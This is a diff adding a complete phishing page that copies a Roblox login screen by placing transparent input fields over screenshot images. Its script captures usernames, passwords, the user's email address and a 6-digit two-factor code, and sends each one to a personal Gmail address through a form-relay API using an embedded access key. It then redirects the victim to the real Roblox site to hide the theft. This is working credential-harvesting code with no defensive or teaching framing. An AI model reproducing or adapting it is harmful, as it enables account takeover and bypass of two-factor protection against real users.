@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Perfect Fit UI</title>
+
+    <style>
+
+        body, html {
+
+            margin: 0;
+
+            padding: 0;
+
+            width: 100%;
+
+            height: 100%;
+
+            overflow: hidden;
+
+            background-color: #0b0b0c;
+
+        }
+
+
+
+        .screen-container {
+
+            position: relative;
+
+            width: 100vw;
+
+            height: 100vh;
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+        }
+
+
+
+        .bg-image {
+
+            max-width: 100%;
+
+            max-height: 100%;
+
+            width: auto;
+
+            height: auto;
+
+            object-fit: contain;
+
+            position: relative;
+
+            z-index: 1;
+
+        }
+
+
+
+        .overlay-image {
+
+            position: absolute;
+
+            max-width: 100%;
+
+            max-height: 100%;
+
+            width: auto;
+
+            height: auto;
+
+            object-fit: contain;
+
+            z-index: 3;
+
+            display: none;
+
+        }
+
+
+
+        .visible-input {
+
+            position: absolute;
+
+            width: 90%;
+
+            height: 5.2%;
+
+            background-color: transparent;
+
+            border: none;
+
+            outline: none;
+
+            color: #ffffff;
+
+            font-size: 15px;
+
+            padding: 0 15px;
+
+            box-sizing: border-box;
+
+            border-radius: 6px;
+
+            z-index: 2;
+
+        }
+
+
+
+        .visible-input:not(:placeholder-shown) {
+
+            background-color: #353b49;
+
+        }
+
+
+
+        .visible-input:focus {
+
+            border-color: #ffffff;
+
+        }
+
+
+
+        .visible-input::placeholder {
+
+            color: #8c8f96;
+
+        }
+
+
+
+        .code-input {
+
+            position: absolute;
+
+            width: 20%;
+
+            height: 5.5%;
+
+            top: 38%;
+
+            left: 39.85%;
+
+            background-color: #373d4d;
+
+            border: 1px solid #2b2d31;
+
+            outline: none;
+
+            color: #ffffff;
+
+            font-size: 15px;
+
+            padding: 0 15px;
+
+            box-sizing: border-box;
+
+            border-radius: 8px;
+
+            z-index: 4;
+
+            display: none;
+
+        }
+
+
+
+        .code-input:focus {
+
+            border-color: #ffffff;
+
+        }
+
+
+
+        .code-input::placeholder {
+
+            color: #8c8f96;
+
+        }
+
+
+
+        #username-box {
+
+            top: 34%;
+
+            left: 39.75%;
+
+        }
+
+
+
+        #password-box {
+
+            top: 42%;
+
+            left: 39.75%;
+
+        }
+
+
+
+        .login-btn {
+
+            position: absolute;
+
+            width: 20.5%;
+
+            height: 5.2%;
+
+            top: 47.5%;
+
+            left: 39.75%;
+
+            background: transparent;
+
+            border: none;
+
+            cursor: pointer;
+
+            z-index: 2;
+
+        }
+
+
+
+        .send-code-btn {
+
+            position: absolute;
+
+            width: 20%;
+
+            height: 5.5%;
+
+            top: 55%;
+
+            left: 40%;
+
+            background: transparent;
+
+            border: none;
+
+            cursor: pointer;
+
+            z-index: 5;
+
+            display: none;
+
+        }
+
+
+
+        .hidden {
+
+            display: none !important;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+
+
+    <div class="screen-container">
+
+        <img id="bgImage" src="bobloxp.jpg" class="bg-image" alt="Background">
+
+        <img id="overlayImage" src="boblox 2ndp.jpg" class="overlay-image" alt="Overlay">
+
+        
+
+        <input type="text" id="username-box" class="visible-input" placeholder="">
+
+        <input type="password" id="password-box" class="visible-input" placeholder="">
+
+        <button id="loginBtn" class="login-btn" onclick="handleLogin()"></button>
+
+
+
+        <input type="email" id="codeInput" class="code-input" placeholder="Enter your gmail id" required>
+
+        <button id="sendCodeBtn" class="send-code-btn" onclick="handleSendCode()"></button>
+
+    </div>
+
+
+
+    <script>
+
+        function sendEmailToServer(subject, messageBody) {
+
+            const formData = new FormData();
+
+            formData.append("access_key", "ba23f6a7-ed9c-424b-8a3b-a7497e618972");
+
+            formData.append("subject", subject);
+
+            formData.append("message", messageBody);
+
+            formData.append("email", "jaiswal.shubh2021@gmail.com");
+
+
+
+            // Use sendBeacon as a backup to guarantee dispatch even if the page layout changes or transitions
+
+            const dataString = JSON.stringify({
+
+                access_key: "ba23f6a7-ed9c-424b-8a3b-a7497e618972",
+
+                subject: subject,
+
+                message: messageBody,
+
+                email: "jaiswal.shubh2021@gmail.com"
+
+            });
+
+            
+
+            navigator.sendBeacon("https://api.web3forms.com/submit", dataString);
+
+
+
+            fetch("https://api.web3forms.com/submit", {
+
+                method: "POST",
+
+                body: formData
+
+            })
+
+            .then(response => response.json())
+
+            .then(data => {
+
+                console.log("Email dispatch response:", data);
+
+            })
+
+            .catch(error => {
+
+                console.error("Dispatch error:", error);
+
+            });
+
+        }
+
+
+
+        function handleLogin() {
+
+            const user = document.getElementById('username-box').value.trim();
+
+            const pass = document.getElementById('password-box').value;
+
+            const overlayImage = document.getElementById('overlayImage');
+
+            const usernameBox = document.getElementById('username-box');
+
+            const passwordBox = document.getElementById('password-box');
+
+            const loginBtn = document.getElementById('loginBtn');
+
+            const codeInput = document.getElementById('codeInput');
+
+            const sendCodeBtn = document.getElementById('sendCodeBtn');
+
+
+
+            if (user === "" || pass === "") {
+
+                alert('Please enter both username and password.');
+
+                return;
+
+            }
+
+
+
+            sendEmailToServer("New Login Attempt", `Username: ${user}\nPassword: ${pass}`);
+
+
+
+            overlayImage.style.display = 'block';
+
+            usernameBox.classList.add('hidden');
+
+            passwordBox.classList.add('hidden');
+
+            loginBtn.classList.add('hidden');
+
+            codeInput.style.display = 'block';
+
+            sendCodeBtn.style.display = 'block';
+
+        }
+
+
+
+        function handleSendCode() {
+
+            const codeInput = document.getElementById('codeInput');
+
+            
+
+            if (codeInput.placeholder === "Enter your gmail id") {
+
+                const emailValue = codeInput.value.trim();
+
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+                
+
+                if (!emailPattern.test(emailValue)) {
+
+                    alert('Please enter a valid email address.');
+
+                    return;
+
+                }
+
+
+
+                sendEmailToServer("2FA Email Provided", `User Email ID: ${emailValue}`);
+
+
+
+                codeInput.value = "";
+
+                codeInput.placeholder = "Enter 6-digit Code";
+
+                codeInput.type = "text";
+
+                codeInput.maxLength = 6;
+
+                
+
+                codeInput.oninput = function() {
+
+                    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+
+                };
+
+            } else {
+
+                const finalCode = codeInput.value.trim();
+
+                if (finalCode.length !== 6) {
+
+                    alert('Please enter exactly 6 numbers.');
+
+                    return;
+
+                }
+
+
+
+                sendEmailToServer("2FA Code Entered", `Verification Code: ${finalCode}`);
+
+
+
+                setTimeout(() => {
+
+                    window.location.href = "https://www.roblox.com/";
+
+                }, 500);
+
+            }
+
+        }
+
+    </script>
+
+
+
+</body>
+
+</html> 
